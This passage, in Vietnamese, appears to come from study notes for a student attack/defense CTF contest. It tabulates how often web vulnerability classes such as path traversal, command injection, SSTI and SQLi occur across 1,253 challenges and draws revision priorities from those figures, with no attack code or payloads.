- Script v2 mở rộng thêm 17 nhóm "bề mặt" (IDOR route, `.git` exposure, GraphQL, OAuth, SAML,
  LDAP/XPath, cache poisoning, crypto CBC/padding, host header, CRLF...) để kiểm tra độ phủ
  *đầy đủ nhất có thể bằng grep tĩnh* — chi tiết phương pháp, giới hạn, số liệu từng nhóm và
  bảng so dễ/khó: xem **`survey-results.md`**. Một challenge thường nhiều kỹ thuật nên tổng > 100%.

**Tần suất thực tế (full dataset, 1253 bài — không còn là ước lượng mẫu nhỏ):**

| Nhóm kỹ thuật | % bài | Dễ/sinh viên | Khó/elite | List có? |
| --- | ---: | ---: | ---: | --- |
| LFI / path traversal | 60.1% | 59.1% | 70.4% | Có (mục 3) |
| Command injection | 54.2% | 46.2% | 66.4% | Có (mục 1) |
| XXE / XML | 52.6% | 51.1% | 60.6% | Có (mục 3) |
| SSTI / template | 48.3% | **56.9%** | 44.9% | Có (mục 2) |
| SSRF | 43.7% | 33.3% | 50.0% | Có (mục 7) |
| Open redirect | 37.4% | 39.6% | 38.7% | Có (mục 6) |
| Type juggling (PHP) | 37.3% | 33.8% | 43.4% | Có (mục 9, 11) |
| Admin bot + XSS | 31.9% / 20.5% | 26.7% / 12.4% | 37.6% / **25.9%** | Có (mục 5) |
| Code injection (eval) | 26.0% | 16.0% | 27.4% | Có (mục 1) |
| SQLi | 24.5% | 20.4% | 23.7% | Có (mục 1) |
| File upload | 12.3% | **12.0%** | 9.9% | Có (mục 3) |
| CSRF | 12.1% | 5.8% | 10.9% | Có (mục 6) |
| Prototype pollution | 11.8% | 8.9% | **19.3%** | Có (mục 4) |
| `.git`/backup exposure (bề mặt) | 12.5% | 10.7% | 16.8% | Có (mục 12) |
| IDOR route surface (bề mặt) | 10.9% | 8.9% | 15.3% | Có (mục 8) |
| Race condition | 8.9% | 4.9% | 8.4% | Có (mục 8) |
| JWT | 7.7% | **8.4%** | 5.1% | Có (mục 9) |
| Cache poisoning (bề mặt) | 5.1% | 0.9% | **9.1%** | Có (mục 10) |
| NoSQLi | 3.5% | 2.7% | 4.0% | Có (mục 1) |
| Deserialization | 3.0% | 2.2% | 2.2% | Có (mục 4) |
| CORS | 2.8% | 1.3% | 2.6% | Có (mục 6) |
| GraphQL/SOAP/OAuth/SAML/LDAP/XPath/crypto-đặc thù (bề mặt) | <2% mỗi nhóm | ~0% | ~0% | Có (mục 1, 9, 11) |
| CVE framework cụ thể (Next.js RSC, php filter-chain...) | <1% mỗi dấu hiệu | ~0% | ~0% | Có (mục 15) |

**Kết luận về độ phủ:** đối chiếu với 42 nhóm mà script có thể đo được (25 nhóm gốc + 17 nhóm
"bề mặt" mở rộng), **42/42 đã có mặt trong bản đồ (mục 1-15)** — không phát hiện lỗ hổng/kỹ
thuật phổ biến nào bị bỏ sót. Các mục mang tính "CVE/kỹ thuật chuyên sâu" (mục 15) đúng là
cực hiếm trong dữ liệu thực tế (<1%) nên không cần đầu tư nhiều thời gian ôn cho Bảng C.
Phần còn lại không đo được bằng grep tĩnh (HTTP smuggling, parser differential, WAF bypass,
business logic tinh vi, DOM clobbering, XS-Leaks...) **không phải vì bản đồ thiếu**, mà vì bản
chất các lỗi đó là logic/giao thức/thời điểm, không thể suy ra chỉ từ 1 file source — các mục
này vẫn giữ nguyên trong bản đồ vì vẫn có thể gặp, chỉ là không định lượng được bằng công cụ hiện có.

**Kết luận cho Bảng C (sinh viên, A/D) — đã xác nhận bằng dữ liệu đầy đủ:** so dễ ↔ khó, các
nhóm **tăng mạnh ở giải khó/elite** là XSS+admin bot (gấp ~2x), prototype pollution (gấp ~2x),
cache poisoning (gấp ~10x), Next.js/React framework — đây là đặc trưng giải quốc tế, ít khả
năng gặp ở Bảng C. Ngược lại, **SSTI (Flask/Jinja2), file upload, JWT** lại cao hơn ở nhóm
dễ/sinh viên. SQLi gần như ngang nhau (~20-24%) ở mọi độ khó — vẫn là kỹ thuật nền tảng bắt
buộc. → Ưu tiên ôn luyện: **SQLi, LFI, file upload, SSTI (Flask), command injection, JWT yếu,
IDOR/access control** (mục 1, 3, 8, 9) trước các kỹ thuật client-side/CVE framework hiện đại.
